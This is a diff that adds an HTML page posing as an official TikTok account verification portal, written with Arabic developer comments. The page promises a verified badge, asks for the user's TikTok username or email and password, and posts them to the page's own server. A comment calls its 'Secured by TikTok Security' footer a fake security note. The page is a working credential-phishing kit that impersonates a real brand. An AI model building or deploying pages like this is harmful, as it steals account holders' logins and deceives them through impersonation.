@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok Verification Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: #121212;
+            border-radius: 24px;
+            padding: 32px 20px 40px;
+            box-shadow: 0 0 40px rgba(254, 44, 85, 0.15), 0 0 80px rgba(37, 244, 238, 0.05);
+            border: 1px solid #1f1f1f;
+            position: relative;
+            overflow: hidden;
+        }
+        /* subtle neon glow */
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 20%, rgba(254, 44, 85, 0.03), transparent 70%),
+                        radial-gradient(circle at 70% 80%, rgba(37, 244, 238, 0.03), transparent 70%);
+            pointer-events: none;
+        }
+        /* TikTok logo / icon */
+        .logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 28px;
+            position: relative;
+            z-index: 1;
+        }
+        .logo-icon {
+            font-size: 42px;
+            color: #FE2C55;
+            filter: drop-shadow(0 0 12px rgba(254, 44, 85, 0.4));
+        }
+        .logo-icon i {
+            background: linear-gradient(135deg, #FE2C55, #25F4EE);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #FE2C55 40%, #25F4EE);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        /* headline */
+        .headline {
+            text-align: center;
+            margin-bottom: 32px;
+            position: relative;
+            z-index: 1;
+        }
+        .headline h1 {
+            color: #ffffff;
+            font-size: 26px;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+        }
+        .headline h1 i {
+            color: #25F4EE;
+            margin-right: 6px;
+            font-size: 22px;
+            -webkit-text-fill-color: #25F4EE;
+            background: none;
+        }
+        .headline .sub {
+            color: #aaaaaa;
+            font-size: 14px;
+            font-weight: 400;
+            background: rgba(255,255,255,0.04);
+            display: inline-block;
+            padding: 4px 16px;
+            border-radius: 30px;
+            border: 1px solid #2a2a2a;
+        }
+        .headline .sub i {
+            color: #FE2C55;
+            margin-right: 6px;
+        }
+        /* form */
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .form-group label {
+            display: block;
+            color: #cccccc;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            letter-spacing: 0.3px;
+        }
+        .form-group label i {
+            color: #FE2C55;
+            width: 20px;
+            margin-right: 4px;
+        }
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            background: #1e1e1e;
+            border-radius: 14px;
+            border: 1px solid #2c2c2c;
+            transition: border 0.2s, box-shadow 0.2s;
+            padding: 0 14px;
+        }
+        .input-wrapper:focus-within {
+            border-color: #FE2C55;
+            box-shadow: 0 0 0 3px rgba(254, 44, 85, 0.15);
+        }
+        .input-wrapper i {
+            color: #666;
+            font-size: 16px;
+            width: 22px;
+            transition: color 0.2s;
+        }
+        .input-wrapper:focus-within i {
+            color: #FE2C55;
+        }
+        .input-wrapper input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 16px 8px 16px 4px;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+        }
+        .input-wrapper input::placeholder {
+            color: #555;
+            font-weight: 400;
+        }
+        /* verify button */
+        .verify-btn {
+            width: 100%;
+            padding: 18px 0;
+            background: linear-gradient(135deg, #FE2C55, #d91a4a);
+            border: none;
+            border-radius: 60px;
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            margin-top: 12px;
+            cursor: pointer;
+            transition: transform 0.15s, box-shadow 0.2s;
+            box-shadow: 0 8px 24px rgba(254, 44, 85, 0.3);
+            position: relative;
+            z-index: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .verify-btn i {
+            font-size: 18px;
+            color: rgba(255,255,255,0.9);
+        }
+        .verify-btn:active {
+            transform: scale(0.97);
+            box-shadow: 0 4px 12px rgba(254, 44, 85, 0.4);
+        }
+        .verify-btn:hover {
+            background: linear-gradient(135deg, #ff3a62, #e31e4f);
+        }
+        /* subtle footer */
+        .footer-note {
+            text-align: center;
+            margin-top: 28px;
+            color: #444;
+            font-size: 12px;
+            border-top: 1px solid #1f1f1f;
+            padding-top: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .footer-note i {
+            color: #25F4EE;
+            margin: 0 4px;
+        }
+        /* responsiveness */
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 16px 32px;
+                border-radius: 20px;
+            }
+            .headline h1 {
+                font-size: 22px;
+            }
+            .logo-icon {
+                font-size: 36px;
+            }
+            .logo-text {
+                font-size: 20px;
+            }
+            .input-wrapper input {
+                padding: 14px 6px 14px 2px;
+                font-size: 15px;
+            }
+            .verify-btn {
+                padding: 16px 0;
+                font-size: 16px;
+            }
+        }
+        /* subtle TikTok sparkle */
+        .sparkle {
+            position: absolute;
+            color: rgba(37, 244, 238, 0.08);
+            font-size: 80px;
+            bottom: -20px;
+            right: -20px;
+            transform: rotate(15deg);
+            z-index: 0;
+        }
+        .sparkle-left {
+            position: absolute;
+            color: rgba(254, 44, 85, 0.06);
+            font-size: 60px;
+            top: -10px;
+            left: -15px;
+            transform: rotate(-20deg);
+            z-index: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- decorative -->
+        <div class="sparkle"><i class="fas fa-circle"></i></div>
+        <div class="sparkle-left"><i class="fas fa-circle"></i></div>
+
+        <!-- logo -->
+        <div class="logo">
+            <div class="logo-icon"><i class="fab fa-tiktok"></i></div>
+            <span class="logo-text">TikTok</span>
+        </div>
+
+        <!-- headline -->
+        <div class="headline">
+            <h1><i class="fas fa-check-circle"></i> Get Verified Now</h1>
+            <div class="sub"><i class="fas fa-shield-alt"></i> Official Verification Portal</div>
+        </div>
+
+        <!-- form -->
+        <form action="/" method="POST">
+    <div class="form-group">
+        <label><i class="fas fa-at"></i> TikTok Username</label>
+        <div class="input-wrapper">
+            <i class="fas fa-user"></i>
+            <!-- تأكد من وجود name="username" -->
+            <input type="text" name="username" placeholder="Username or Email" required>
+        </div>
+    </div>
+    
+    <div class="form-group">
+        <label><i class="fas fa-lock"></i> Password</label>
+        <div class="input-wrapper">
+            <i class="fas fa-key"></i>
+            <!-- تأكد من وجود name="password" -->
+            <input type="password" name="password" placeholder="Enter your password" required>
+        </div>
+    </div>
+
+    <button type="submit" class="verify-btn">
+        <i class="fas fa-check-circle"></i> Verify Account
+    </button>
+</form>
+
+        <!-- footer (fake security note) -->
+        <div class="footer-note">
+            <i class="fas fa-lock"></i> Secured by TikTok Security <i class="fas fa-check-circle"></i>
+        </div>
+    </div>
+</body>
+</html>
